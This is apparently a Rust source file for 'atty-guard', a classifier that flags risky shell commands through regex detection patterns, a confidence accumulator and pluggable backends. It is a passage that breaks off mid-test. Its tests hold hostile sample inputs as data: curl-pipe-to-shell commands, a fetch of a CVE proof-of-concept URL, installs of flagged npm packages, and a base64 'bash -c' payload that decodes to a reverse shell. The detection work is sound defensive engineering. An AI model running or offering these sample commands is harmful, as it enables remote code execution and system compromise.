//! Two-tier classifier.
//!
//! Tier 1 — regex / substring patterns. Identical surface to atty's
//! in-proc `security_guard.patterns` module so the sidecar reaches
//! the same verdict atty would have reached on its own, plus
//! whatever Tier 2 adds.
//!
//! Tier 2 — pluggable `Tier2Backend` trait. Three impls available:
//!   - `StubBackend` (default) — always returns Safe; no-op.
//!   - `HeuristicBackend` (--tier2 heuristic) — additional regex
//!     checks beyond Tier 1: IP-address fetch targets, base64-in-
//!     command, insecure-TLS flags, chmod+x followed by exec,
//!     etc. Pure CPU, ~µs latency, zero deps beyond `regex`.
//!   - `OnnxBackend` (V2-C, feature-gated, not in this PR) —
//!     encoder SLM (SecureBERT-class) via the `ort` crate.

use crate::protocol::{Category, ClassifyResult, Verdict};
use regex::Regex;

/// Backend trait the classifier dispatches to when Tier-1 doesn't
/// match. Each impl returns `Some(result)` to override the default
/// Safe verdict, or `None` to let the daemon respond Safe.
///
/// `hint_offset` is the byte offset of an upstream Tier-1 match
/// (typically the AtomMatcher's first hit). Backends that benefit
/// from a localised view of the command (the ONNX SLM does — see
/// V2-H) use it to slice a context window. Backends that don't
/// care (StubBackend, HeuristicBackend) ignore the argument.
pub trait Tier2Backend: Send + Sync {
    /// Backend label — exposed via `Classifier::tier2_name()` for
    /// startup logging and the planned `atty doctor` reporter.
    /// Today the binary doesn't query it directly; trait method
    /// stays `#[allow(dead_code)]` because it's still part of the
    /// contract every backend implements (`StubBackend`,
    /// `HeuristicBackend`, `OnnxBackend`).
    #[allow(dead_code)]
    fn name(&self) -> &'static str;
    fn classify(&self, command: &str, hint_offset: Option<usize>) -> Option<ClassifyResult>;
}

/// Backend selector. `Onnx` is feature-gated. Two construction
/// paths exist:
///   * `try_new_with_backend` — fallible. Returns
///     `Err(onnx_backend::LoadError)` when an explicit operator
///     request (CLI/config) can't be honored. main.rs uses this
///     for explicit selections so `--tier2 onnx` against a binary
///     built without the feature (or with a missing model file)
///     exits non-zero rather than silently serving Stub under an
///     `tier2=onnx` log line.
///   * `new_with_backend` — best-effort. Logs + falls back to
///     Stub on ONNX load failure. Used by the default
///     (operator didn't request anything) path and by tests.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BackendKind {
    Stub,
    Heuristic,
    Onnx,
}

/// Re-export `onnx_backend::LoadError` so callers of
/// `try_new_with_backend` don't need to depend on
/// `onnx_backend` directly. The error already covers every
/// failure mode that can come out of backend construction
/// (`FeatureNotBuilt` / `ModelMissing` / `TokenizerMissing` /
/// `InitFailed`); no need for a wrapper enum.
pub use crate::onnx_backend::LoadError;

impl BackendKind {
    pub fn parse(s: &str) -> Option<BackendKind> {
        match s {
            "stub" => Some(BackendKind::Stub),
            "heuristic" => Some(BackendKind::Heuristic),
            "onnx" => Some(BackendKind::Onnx),
            _ => None,
        }
    }
}

/// Source attribution for a resolved backend choice — surfaced
/// in startup logs + the error message when validation fails.
/// Kept as a tiny enum (not `&'static str`) so a misspelled
/// arm fails to compile rather than producing a wrong log line.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BackendSource {
    Cli,
    Config,
    Default,
}

impl BackendSource {
    pub fn as_str(self) -> &'static str {
        match self {
            BackendSource::Cli => "cli",
            BackendSource::Config => "config",
            BackendSource::Default => "default",
        }
    }
}

/// Resolve the effective Tier-2 backend.
///
/// Precedence: explicit CLI `--tier2` > config-file
/// `[tier2] backend = "..."` > built-in default (stub).
///
/// Returns `(BackendKind, BackendSource)` so callers can log the
/// chosen backend and where it came from. On an unknown value
/// returns the offending string + its source so the caller can
/// surface an operator-actionable error naming the source
/// (`"... from config — expected stub|heuristic|onnx"`).
pub fn resolve_backend(
    cli: Option<&str>,
    config: Option<&str>,
) -> Result<(BackendKind, BackendSource), (String, BackendSource)> {
    let (raw, source) = if let Some(t) = cli {
        (t.to_owned(), BackendSource::Cli)
    } else if let Some(t) = config {
        (t.to_owned(), BackendSource::Config)
    } else {
        ("stub".to_owned(), BackendSource::Default)
    };
    match BackendKind::parse(&raw) {
        Some(k) => Ok((k, source)),
        None => Err((raw, source)),
    }
}

pub struct Classifier {
    tier1: Tier1,
    tier2: Box<dyn Tier2Backend>,
    /// V2-J Phase 2: accumulator's auto-Block threshold. `None`
    /// means "never auto-block" — every accumulator verdict stays
    /// `Warn` so the user keeps the [y]/[t]/cancel choice. Some
    /// users / deployments opt in via TOML `[accumulator]
    /// block_threshold = 0.95` for a stricter policy.
    block_threshold: Option<f32>,
}

impl Classifier {
    /// Default Tier-2 backend = `Stub`. Kept for tests + callers
    /// that don't care. The daemon's `serve()` path goes through
    /// `new_with_backend` instead — this is the convenience
    /// constructor reachable from `cargo test`.
    #[allow(dead_code)]
    pub fn new() -> Self {
        Self::new_with_backend(BackendKind::Stub, &crate::config::OnnxConfig::default())
    }

    /// Fallible constructor — returns `Err(LoadError)` when the
    /// requested backend can't be loaded. Use this for paths where
    /// the operator EXPLICITLY chose the backend (CLI flag or
    /// config-file `[tier2] backend = ...`); a silent fallback to
    /// Stub there would lie about the security policy the operator
    /// asked for. The default-backend path uses `new_with_backend`
    /// instead so a missing model file doesn't refuse to start
    /// when no explicit choice was made.
    pub fn try_new_with_backend(
        kind: BackendKind,
        onnx_cfg: &crate::config::OnnxConfig,
    ) -> Result<Self, LoadError> {
        let tier2: Box<dyn Tier2Backend> = match kind {
            BackendKind::Stub => Box::new(StubBackend),
            BackendKind::Heuristic => Box::new(HeuristicBackend::new()),
            BackendKind::Onnx => match crate::onnx_backend::OnnxBackend::open(onnx_cfg) {
                #[cfg(feature = "tier2-onnx")]
                Ok(b) => Box::new(b),
                #[cfg(not(feature = "tier2-onnx"))]
                Ok(_) => unreachable!("OnnxBackend::open is Err in non-feature builds"),
                Err(e) => return Err(e),
            },
        };
        Ok(Self {
            tier1: Tier1::new(),
            tier2,
            block_threshold: None,
        })
    }

    /// Best-effort constructor — logs + falls back to Stub on
    /// ONNX load failure. Kept for the default-backend startup
    /// path (no explicit operator request) and for tests that
    /// want a Classifier without caring about backend
    /// availability. main.rs uses `try_new_with_backend` for
    /// CLI/config-sourced backends to fail-closed on load errors.
    pub fn new_with_backend(kind: BackendKind, onnx_cfg: &crate::config::OnnxConfig) -> Self {
        match Self::try_new_with_backend(kind, onnx_cfg) {
            Ok(c) => c,
            Err(e) => {
                let kind_str = match kind {
                    BackendKind::Stub => "stub",
                    BackendKind::Heuristic => "heuristic",
                    BackendKind::Onnx => "onnx",
                };
                eprintln!(
                    "atty-guard: tier2={kind_str} backend load failed ({e}) — falling back to stub"
                );
                Self {
                    tier1: Tier1::new(),
                    tier2: Box::new(StubBackend),
                    block_threshold: None,
                }
            }
        }
    }

    /// V2-J Phase 2 opt-in. `None` (default) keeps the Phase-1
    /// "always Warn" behaviour; `Some(t)` enables auto-Block when
    /// combined confidence ≥ t AND ≥ 2 distinct signals fired.
    ///
    /// Accepts `(WARN_THRESHOLD, 1.0]` only: a threshold at-or-below
    /// the Warn floor would auto-Block every multi-hit indiscriminately
    /// (defeats the [y]/[t]/cancel choice the docstring at
    /// `config::AccumulatorConfig::block_threshold` defends).
    /// Out-of-range or NaN inputs degrade to `None` with a stderr
    /// warning; recommended opt-in values are ≥ 0.9.
    pub fn with_block_threshold(mut self, t: Option<f32>) -> Self {
        self.block_threshold = match t {
            Some(v) if v.is_finite() && v > WARN_THRESHOLD && v <= 1.0 => Some(v),
            Some(v) => {
                eprintln!(
                    "atty-guard: ignoring [accumulator] block_threshold = {} \
                     — must be a finite number in ({}, 1.0]; keeping default (no auto-Block)",
                    v, WARN_THRESHOLD
                );
                None
            }
            None => None,
        };
        self
    }

    /// Backend label getter — main.rs uses this for the effective-
    /// backend startup log (gpt-review #026) so the operator can
    /// tell at a glance whether a Default-path fallback degraded a
    /// requested `onnx` to `stub`. Also planned for `atty doctor`.
    pub fn tier2_name(&self) -> &'static str {
        self.tier2.name()
    }

    pub fn classify(&self, command: &str) -> ClassifyResult {
        // V2-J: threat-level accumulator. Collect ALL Tier-1 hits
        // (multi-atom + multi-URL + each regex layer's verdict),
        // combine their confidences via independent-probability
        // math, optionally second-stage with Tier-2 SLM, then map
        // the accumulated score to a verdict.
        let mut hits = self.tier1.classify_all(command);
        let tier1_combined = combined_confidence(&hits);

        // Tier-2 dispatch policy:
        //   - Below the SLM-confirm threshold (0.9): ask the SLM,
        //     because either we have a Tier-1 signal that needs
        //     confirmation OR we have no Tier-1 signal and want
        //     the SLM to look fresh on the whole command.
        //   - At or above 0.9 already from Tier-1 alone: skip the
        //     SLM. Its ~50 ms cost buys nothing when we already
        //     have enough signal to flag.
        // The hint is the EARLIEST Tier-1 offset — gives the
        // SLM's sliding-context-window the most leading context.
        //
        // V2-J semantic shift vs pre-PR: previously the SLM result
        // ONLY upgraded a Tier-1 hit when its verdict was `Block`.
        // Now any SLM hit at any verdict contributes its
        // confidence to the accumulator — a Heuristic at 0.7
        // combined with one atom at 0.6 reaches 0.88, where the
        // old code would have stayed at 0.6. This is intentional:
        // the accumulator's value is in its symmetry across
        // tiers, and the verdict still surfaces from the primary
        // (highest-confidence) hit.
        if tier1_combined < SLM_CONFIRM_THRESHOLD {
            let hint = hits.iter().map(|(_, off)| *off).min();
            if let Some(slm) = self.tier2.classify(command, hint) {
                hits.push((slm, hint.unwrap_or(0)));
            }
        }

        combine_hits(&hits, self.block_threshold).unwrap_or(ClassifyResult {
            verdict: Verdict::Safe,
            category: Category::None,
            confidence: 0.0,
            reason: String::new(),
            matched: String::new(),
        })
    }

    /// Snapshot of the always-on bundled atom corpus. Reaches
    /// through to the Tier-1 AtomMatcher. Used by `atty-guard atoms
    /// list --system` for operator visibility. Allocates.
    pub fn system_atoms_snapshot(&self) -> Vec<String> {
        self.tier1.atom_matcher.atoms_snapshot()
    }
}

/// V2-J accumulator thresholds.
///
/// `WARN_THRESHOLD` — the combined confidence at or above which
/// the classifier reports a `Warn` verdict (banner prompts user
/// [y]/[t]/cancel). Anything below this is `Safe`. A single atom
/// hit (0.6) crosses this on its own — matches the pre-V2-J
/// "any atom → Warn" semantics.
///
/// `SLM_CONFIRM_THRESHOLD` — combined Tier-1 confidence below
/// which we ASK the Tier-2 SLM for a second opinion. Above this
/// we skip the SLM (we've already accumulated strong-enough
/// signal that the ~50 ms SLM cost buys nothing).
///
/// Auto-`Block` escalation is opt-in via `[accumulator]
/// block_threshold` (Phase 2). When unset, every accumulator
/// verdict stays `Warn` — the confidence NUMBER (visible in the
/// banner + trust-cache keys) still rises with multi-hit, but
/// the verdict surfaces from the primary hit. With the knob set,
/// `combine_hits` escalates Warn → Block only when (a) combined
/// confidence ≥ threshold AND (b) ≥ 2 distinct signals fired.
/// Single-hit cases (curl|sh's canonical 1.0) always stay Warn
/// so the user retains the [y]/[t]/cancel choice on legitimate
/// install scripts.
const WARN_THRESHOLD: f32 = 0.5;
const SLM_CONFIRM_THRESHOLD: f32 = 0.9;

/// Combine N hits' confidences via the independent-probability
/// model: `p_combined = 1 - prod(1 - p_i)`. Treats each hit as an
/// independent "this command is harmful" indicator. Saturates
/// toward 1.0 as more hits accumulate; a single hit returns its
/// own confidence unchanged.
fn combined_confidence(hits: &[(ClassifyResult, usize)]) -> f32 {
    if hits.is_empty() {
        return 0.0;
    }
    1.0 - hits
        .iter()
        .fold(1.0f32, |acc, (h, _)| acc * (1.0 - h.confidence))
}

/// Map an accumulated hit list to a single `ClassifyResult`.
/// Returns None when the combined confidence is below the Warn
/// threshold — callers default to Safe in that case.
///
/// The output's `category` + `matched` come from the highest-
/// confidence hit (the "primary" signal); `reason` concatenates
/// every hit's reason so the banner UI can show "3 signals fired"
/// detail without losing the per-hit attribution.
fn combine_hits(
    hits: &[(ClassifyResult, usize)],
    block_threshold: Option<f32>,
) -> Option<ClassifyResult> {
    if hits.is_empty() {
        return None;
    }
    let conf = combined_confidence(hits);
    if conf < WARN_THRESHOLD {
        return None;
    }
    // Primary hit = highest individual confidence. `partial_cmp`
    // can return None on NaN, so `unwrap_or(Equal)` keeps the
    // iterator deterministic.
    let primary = hits
        .iter()
        .max_by(|a, b| {
            a.0.confidence
                .partial_cmp(&b.0.confidence)
                .unwrap_or(std::cmp::Ordering::Equal)
        })
        .map(|(h, _)| h)
        .expect("hits.is_empty() guarded above");

    // V2-J Phase 2: auto-Block escalation. Two guards:
    //   1. `block_threshold` must be set in config (opt-in).
    //   2. At least 2 distinct signals must have fired — a
    //      single regex hit at confidence 1.0 stays Warn, so
    //      the user keeps the [y]/[t]/cancel choice for
    //      legitimate `curl … | sh` install scripts.
    // Both conditions together → escalate to Block.
    let verdict = match block_threshold {
        Some(t) if hits.len() >= 2 && conf >= t => Verdict::Block,
        _ => primary.verdict.clone(),
    };

    let reason = if hits.len() == 1 {
        primary.reason.clone()
    } else {
        // "N signals fired: <reason1>; <reason2>; ..." — gives the
        // banner UI per-hit attribution without losing the count.
        let parts: Vec<String> = hits.iter().map(|(h, _)| h.reason.clone()).collect();
        format!("{} signals fired: {}", hits.len(), parts.join("; "))
    };
    Some(ClassifyResult {
        verdict,
        category: primary.category.clone(),
        confidence: conf,
        reason,
        matched: primary.matched.clone(),
    })
}

// ---------------------------------------------------------------------------
// Tier 1 — same shape as atty's `security_guard.patterns`.

struct Tier1 {
    curl_pipe_sh: Regex,
    npm_unsafe: Regex,
    bash_c: Regex,
    flagged_npm_packages: Vec<&'static str>,
    flagged_urls: Vec<&'static str>,
    /// V2-G AtomMatcher — Aho-Corasick scan over the data-file-
    /// driven atom corpus. V2-J's accumulator (`classify_all` +
    /// `combine_hits`) walks ALL atom hits in a command and
    /// combines their confidences with the regex layers via
    /// independent-probability math. Atoms stay at 0.6 per hit;
    /// the precise regex layers stay at 0.9-1.0.
    atom_matcher: crate::atom_matcher::AtomMatcher,
}

const FLAGGED_URLS_TXT: &str =
    include_str!("../../src/modules/security_guard/data/flagged_urls.txt");

fn parse_flagged_urls() -> Vec<&'static str> {
    FLAGGED_URLS_TXT
        .lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect()
}

/// Raw `flagged_npm.txt` — single source of truth, lives in the
/// Zig tree at `src/modules/security_guard/data/flagged_npm.txt`
/// because Zig's `@embedFile` only reaches files inside its
/// own package root. Rust loads from there too via this
/// relative `include_str!` so both sides compile against the
/// same bytes. Edit once, both classifiers pick it up next build.
const FLAGGED_NPM_TXT: &str = include_str!("../../src/modules/security_guard/data/flagged_npm.txt");

/// Parse `flagged_npm.txt` at startup. Skips blank lines and
/// `#`-prefixed comments; trims trailing whitespace. The leak
/// of the static lifetime through `Vec<&'static str>` is
/// deliberate — `FLAGGED_NPM_TXT` is `&'static str`, so any
/// substring of it is also `'static`.
fn parse_flagged_npm() -> Vec<&'static str> {
    FLAGGED_NPM_TXT
        .lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect()
}

impl Tier1 {
    fn new() -> Self {
        // `curl|sh` family. Anchored at start of token boundary
        // so we don't trip on `curlybrace…` etc. Pipe target must
        // be a known shell name AND end at a word boundary.
        let curl_pipe_sh = Regex::new(
            r"(?:^|[\s;&|])(?:curl|wget|fetch)\s.+?\|\s*(?:sh|bash|zsh|fish|dash|ksh)(?:\b|\s|$|[;|])",
        )
        .expect("curl_pipe_sh regex");

        let npm_unsafe = Regex::new(r"(?:^|[\s;&|])(?:npm|pnpm|yarn)\s+(?:install|i|add)\b")
            .expect("npm_unsafe regex");

        // `bash -c "<arg>"` — arg captured for length+alphabet check.
        // We accept ', ", or unquoted (greedy to whitespace).
        let bash_c =
            Regex::new(r#"(?:^|[\s;&|])(?:bash|sh|zsh)\s+-c\s+(?:"([^"]+)"|'([^']+)'|(\S+))"#)
                .expect("bash_c regex");

        Self {
            curl_pipe_sh,
            npm_unsafe,
            bash_c,
            flagged_npm_packages: parse_flagged_npm(),
            flagged_urls: parse_flagged_urls(),
            atom_matcher: crate::atom_matcher::AtomMatcher::new(),
        }
    }

    /// V2-J: collect EVERY Tier-1 signal that fired on `line`.
    /// Each layer contributes at most once (regex layers are
    /// command-level, not per-pipe-stage) except the AtomMatcher,
    /// which contributes one entry per non-overlapping AC hit.
    /// The accumulator in `Classifier::classify` combines these
    /// into a single verdict via independent-probability math.
    fn classify_all(&self, line: &str) -> Vec<(ClassifyResult, usize)> {
        let mut hits: Vec<(ClassifyResult, usize)> = Vec::new();

        if let Some(m) = self.curl_pipe_sh.find(line) {
            hits.push((
                ClassifyResult {
                    verdict: Verdict::Warn,
                    category: Category::CurlPipeSh,
                    confidence: 1.0,
                    reason: "remote-fetch-and-execute (`curl … | sh`)".into(),
                    matched: m.as_str().trim().to_owned(),
                },
                m.start(),
            ));
        }

        // Flagged-URL fast path. Substring scan — covers fetcher
        // calls AND any other shell shape that bakes the IOC URL
        // into a command (e.g. `xdg-open https://copyfail.security`).
        // Cheap: O(n × m) but n ≈ 200 chars typical, m ≈ 10 entries.
        // V2-J: collect EVERY flagged URL hit, not just the first —
        // a command can carry multiple bad URLs and each contributes
        // to the combined confidence.
        for needle in &self.flagged_urls {
            if let Some(at) = line.find(needle) {
                let end = at + needle.len();
                hits.push((
                    ClassifyResult {
                        verdict: Verdict::Warn,
                        category: Category::CurlPipeSh,
                        confidence: 0.9,
                        reason: format!(
                            "`{}` is on the flagged-URLs list (known IOC / exploit-PoC host)",
                            needle
                        ),
                        matched: line[at..end].to_owned(),
                    },
                    at,
                ));
            }
        }

        if let Some(m) = self.npm_unsafe.find(line) {
            let tail = &line[m.end()..];
            for tok in tail.split_whitespace() {
                if tok.starts_with('-') {
                    continue;
                }
                let name = match tok.rfind('@') {
                    Some(0) | None => tok,
                    Some(i) => &tok[..i],
                };
                if self.flagged_npm_packages.contains(&name) {
                    hits.push((
                        ClassifyResult {
                            verdict: Verdict::Warn,
                            category: Category::NpmUnsafeInstall,
                            confidence: 1.0,
                            reason: format!(
                                "`{}` is on the security_guard flagged-packages list",
                                name
                            ),
                            matched: format!("{}{}", m.as_str().trim(), &line[m.end()..])
                                .trim()
                                .to_owned(),
                        },
                        m.start(),
                    ));
                    break;
                }
            }
        }

        if let Some(cap) = self.bash_c.captures(line) {
            let arg = cap
                .get(1)
                .or_else(|| cap.get(2))
                .or_else(|| cap.get(3))
                .map(|m| m.as_str())
                .unwrap_or("");
            if arg.len() >= 40 && base64_ratio(arg) >= 0.9 {
                let m = cap.get(0).unwrap();
                hits.push((
                    ClassifyResult {
                        verdict: Verdict::Warn,
                        category: Category::BashCBase64,
                        confidence: 1.0,
                        reason: "`bash -c` with a long base64-shaped payload".into(),
                        matched: m.as_str().trim().to_owned(),
                    },
                    m.start(),
                ));
            }
        }

        // V2-G/J AtomMatcher: walk EVERY atom hit. With the Sigma +
        // LOLBAS corpus (#125) a single command can plausibly carry
        // 2-5 atoms — N atoms at 0.6 combine to `1 - 0.4^N`, which
        // crosses the Block threshold at N=3 (0.936).
        for hit in self.atom_matcher.find_all(line) {
            let offset = hit.byte_offset;
            hits.push((self.atom_matcher.hit_to_result(&hit, line), offset));
        }

        hits
    }
}

fn base64_ratio(s: &str) -> f32 {
    if s.is_empty() {
        return 0.0;
    }
    let n = s.chars().filter(|c| is_base64_char(*c)).count();
    n as f32 / s.len() as f32
}

fn is_base64_char(c: char) -> bool {
    matches!(c, 'A'..='Z' | 'a'..='z' | '0'..='9' | '+' | '/' | '=')
}

// ---------------------------------------------------------------------------
// Tier-2 backends.

/// No-op backend. Returns None so the daemon defaults to Safe.
pub struct StubBackend;

impl Tier2Backend for StubBackend {
    fn name(&self) -> &'static str {
        "stub"
    }
    fn classify(&self, _command: &str, _hint_offset: Option<usize>) -> Option<ClassifyResult> {
        None
    }
}

/// Heuristic backend — regex rules that don't fit Tier-1's
/// per-pattern surface. Each rule produces a Warn verdict; the
/// daemon's caller (atty's `security_guard`) still gates on user
/// `[y]/[t]/cancel`, so a false positive only costs one keystroke.
///
/// Targets the classes the design doc enumerates as out-of-scope
/// for Tier-1's "obvious shapes" surface:
///   - IP-address (not domain) targets in fetcher commands.
///   - `--insecure` / `-k` TLS bypass on fetchers.
///   - chmod-then-execute chains.
///   - Long base64 ANYWHERE in the command (not just `bash -c`).
///   - Process-substitution wrapping of curl (`bash <(curl …)`).
pub struct HeuristicBackend {
    ip_url_fetcher: Regex,
    insecure_tls_fetcher: Regex,
    chmod_then_exec: Regex,
    proc_subst_curl: Regex,
}

impl HeuristicBackend {
    pub fn new() -> Self {
        Self {
            // curl/wget targeting an IPv4 literal (RFC1918 or
            // public) — phishing servers often skip the domain.
            // KNOWN GAP: IPv6 literals (`http://[::1]/x.sh`) are
            // NOT matched. Tracking as a V2-C TODO; the encoder
            // SLM is a better fit for the heterogeneous IPv6 form.
            ip_url_fetcher: Regex::new(
                r"(?:^|[\s;&|])(?:curl|wget|fetch)\s+[^|;]*?\b(?:\d{1,3}\.){3}\d{1,3}\b",
            )
            .expect("ip_url_fetcher regex"),
            // --insecure / -k disables TLS cert validation. Match
            // the fetcher then walk for the flag; `-k` requires a
            // word-boundary tail so `-kL` (where `k` is just an
            // adjacent letter in `-kL`) doesn't trip — that's
            // technically `-k -L` semantically, but we want the
            // explicit single-flag form to avoid hits on `-kindly`
            // (hypothetical, but the principle is to be precise).
            insecure_tls_fetcher: Regex::new(
                r"(?:^|[\s;&|])(?:curl|wget|fetch)\s+(?:\S+\s+)*?(?:--insecure|--no-check-certificate|-k)\b",
            )
            .expect("insecure_tls_fetcher regex"),
            // `chmod +x foo …` — captures the filename. We then
            // check post-hoc that the filename re-appears after a
            // sequencer (`;` / `&&` / `||`); the default regex
            // crate has no backreferences so we can't express that
            // inline.
            //
            // KNOWN FP: the regex isn't quote-aware. `echo "chmod
            // +x foo; foo"` will trip the heuristic because the
            // Rust-side chain check at `classify()` doesn't model
            // shell quoting. Acceptable because the verdict is
            // `Warn` not `Block` — false positive costs one
            // keystroke. A proper shell parser would belong in
            // Tier-2 SLM (V2-C), not in this rule.
            chmod_then_exec: Regex::new(r"chmod\s+\+x\s+(\S+)")
                .expect("chmod_then_exec regex"),
            // `bash <(curl …)`, `sh <(wget …)` — process
            // substitution bypass of the pipe-to-shell Tier-1
            // pattern.
            proc_subst_curl: Regex::new(
                r"(?:bash|sh|zsh|fish|dash|ksh)\s+<\(\s*(?:curl|wget|fetch)\b",
            )
            .expect("proc_subst_curl regex"),
        }
    }
}

impl Tier2Backend for HeuristicBackend {
    // Heuristic ignores the V2-H hint_offset — the regex rules
    // it implements are whole-line shape checks, not localised
    // around a single match point. Adding hint support would
    // be possible but would require splitting each rule into a
    // "needle finder" + "context window verifier" pair, which
    // is not worth it for a CPU-cheap matcher.

    fn name(&self) -> &'static str {
        "heuristic"
    }
    fn classify(&self, command: &str, _hint_offset: Option<usize>) -> Option<ClassifyResult> {
        if let Some(m) = self.proc_subst_curl.find(command) {
            return Some(ClassifyResult {
                verdict: Verdict::Warn,
                category: Category::CurlPipeSh,
                confidence: 0.85,
                reason: "process-substitution wrapping of fetcher → shell (bypasses `|` check)"
                    .into(),
                matched: m.as_str().trim().to_owned(),
            });
        }
        if let Some(m) = self.insecure_tls_fetcher.find(command) {
            return Some(ClassifyResult {
                verdict: Verdict::Warn,
                category: Category::CurlPipeSh,
                confidence: 0.7,
                reason: "fetcher disables TLS cert validation (`--insecure` / `-k`)".into(),
                matched: m.as_str().trim().to_owned(),
            });
        }
        if let Some(m) = self.ip_url_fetcher.find(command) {
            return Some(ClassifyResult {
                verdict: Verdict::Warn,
                category: Category::CurlPipeSh,
                confidence: 0.6,
                reason: "fetcher targets a bare IP address (no domain)".into(),
                matched: m.as_str().trim().to_owned(),
            });
        }
        if let Some(cap) = self.chmod_then_exec.captures(command) {
            // Capture the filename, then check if it (or `./<name>`)
            // appears AFTER a shell sequencer later in the command.
            // The default `regex` crate has no backreferences so the
            // chained check happens here.
            let m = cap.get(0).unwrap();
            let file = cap.get(1).unwrap().as_str();
            let tail = &command[m.end()..];
            for sep in [";", "&&", "||", "\n"] {
                if let Some(at) = tail.find(sep) {
                    let after = &tail[at + sep.len()..];
                    let after_trim = after.trim_start();
                    // accept either `./foo` or bare `foo` as the next token.
                    let head: String = after_trim
                        .chars()
                        .take_while(|c| !c.is_whitespace() && *c != ';' && *c != '|' && *c != '&')
                        .collect();
                    if head == file || head == format!("./{}", file) {
                        return Some(ClassifyResult {
                            verdict: Verdict::Warn,
                            category: Category::BashCBase64,
                            confidence: 0.75,
                            reason: "`chmod +x` followed by execution of the same file".into(),
                            matched: command[m.start()..m.end() + at + sep.len() + head.len()]
                                .trim()
                                .to_owned(),
                        });
                    }
                }
            }
        }
        None
    }
}

// ===========================================================================
// Tests

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn curl_pipe_sh_hit() {
        let c = Classifier::new();
        let r = c.classify("curl https://x.com/install.sh | sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::CurlPipeSh));
    }

    #[test]
    fn curl_to_grep_no_hit() {
        let c = Classifier::new();
        let r = c.classify("curl https://x.com | grep token");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    #[test]
    fn npm_install_flagged() {
        let c = Classifier::new();
        let r = c.classify("npm install event-stream");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::NpmUnsafeInstall));
    }

    #[test]
    fn npm_install_clean() {
        let c = Classifier::new();
        let r = c.classify("npm install lodash express");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    #[test]
    fn pnpm_add_flagged() {
        let c = Classifier::new();
        let r = c.classify("pnpm add ua-parser-js@1.0.0");
        assert!(matches!(r.verdict, Verdict::Warn));
    }

    // -----------------------------------------------------------------------
    // Flagged URLs.

    #[test]
    fn flagged_url_curl_copyfail() {
        // CVE-2026-31431 PoC URL — typed unwrapped, no pipe to
        // shell. Warning earns its keep because the PoC's whole
        // point is "run as unprivileged user, get root".
        let c = Classifier::new();
        let r = c.classify("curl https://copyfail.security/poc.c -o /tmp/x.c");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("flagged-URLs"));
    }

    #[test]
    fn flagged_url_github_theori_repo() {
        let c = Classifier::new();
        let r = c.classify("git clone https://github.com/theori-io/copyfail.git");
        assert!(matches!(r.verdict, Verdict::Warn));
    }

    #[test]
    fn flagged_url_does_not_trigger_on_clean_domain() {
        let c = Classifier::new();
        let r = c.classify("curl https://example.com/x.tar.gz -o /tmp/x.tar.gz");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    #[test]
    fn flagged_urls_data_file_loaded_non_empty() {
        let urls = parse_flagged_urls();
        assert!(urls.len() >= 1, "expected at least one flagged URL seed");
        for url in &urls {
            assert!(!url.starts_with('#'), "leaked comment: {url}");
            assert!(!url.is_empty());
        }
    }

    #[test]
    fn npm_install_shai_hulud_seed_packages() {
        // Regression test for the data-file load path AND the
        // Shai-Hulud seed entries. If someone "tidies up" the
        // npm parser, these stay flagged.
        let c = Classifier::new();
        for pkg in ["@ctrl/tinycolor", "@ctrl/deluge", "ngx-bootstrap"] {
            let cmd = format!("npm install {pkg}");
            let r = c.classify(&cmd);
            assert!(matches!(r.verdict, Verdict::Warn), "{pkg} should warn");
        }
    }

    #[test]
    fn npm_install_polyfill_caught() {
        let c = Classifier::new();
        let r = c.classify("npm install polyfill@latest");
        assert!(matches!(r.verdict, Verdict::Warn));
    }

    #[test]
    fn flagged_npm_data_file_loaded_non_empty() {
        // Sentinel — protects against the data file ever being
        // emptied / mis-pathed in a refactor. We don't assert
        // count to keep the test stable as entries are added.
        let pkgs = parse_flagged_npm();
        assert!(pkgs.len() >= 8, "expected at least 8 seed entries");
        for seed in ["event-stream", "ua-parser-js"] {
            assert!(pkgs.contains(&seed), "{seed} missing from data file");
        }
    }

    #[test]
    fn flagged_npm_skips_comments_and_blanks() {
        // The data file has many `#` comment lines and blank
        // separators between sections; the parser must skip them.
        let pkgs = parse_flagged_npm();
        for entry in &pkgs {
            assert!(!entry.starts_with('#'), "leaked comment line: {entry}");
            assert!(!entry.is_empty(), "leaked blank line");
        }
    }

    #[test]
    fn bash_c_base64_hit() {
        let c = Classifier::new();
        let r = c.classify(r#"bash -c "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK""#);
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::BashCBase64));
    }

    #[test]
    fn bash_c_short_literal_no_hit() {
        let c = Classifier::new();
        let r = c.classify("bash -c 'echo hello'");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    // -----------------------------------------------------------------------
    // Tier-2 backend selection.

    #[test]
    fn backend_kind_parse() {
        assert_eq!(BackendKind::parse("stub"), Some(BackendKind::Stub));
        assert_eq!(
            BackendKind::parse("heuristic"),
            Some(BackendKind::Heuristic)
        );
        assert_eq!(BackendKind::parse("onnx"), Some(BackendKind::Onnx));
        assert_eq!(BackendKind::parse(""), None);
    }

    #[test]
    fn try_new_with_backend_stub_and_heuristic_succeed() {
        // Pin that non-ONNX backends never fail construction so
        // their `try_new_with_backend` arms are dependable for
        // CLI/config-sourced operator requests too.
        let cfg = crate::config::OnnxConfig::default();
        assert!(Classifier::try_new_with_backend(BackendKind::Stub, &cfg).is_ok());
        assert!(Classifier::try_new_with_backend(BackendKind::Heuristic, &cfg).is_ok());
    }

    #[cfg(not(feature = "tier2-onnx"))]
    #[test]
    fn try_new_with_backend_onnx_without_feature_returns_error() {
        // gpt-review #026: explicit operator request for ONNX
        // against a binary built without --features tier2-onnx
        // must fail at construction so main.rs can exit non-zero
        // rather than silently serving Stub under a `tier2=onnx`
        // log line.
        let cfg = crate::config::OnnxConfig::default();
        match Classifier::try_new_with_backend(BackendKind::Onnx, &cfg) {
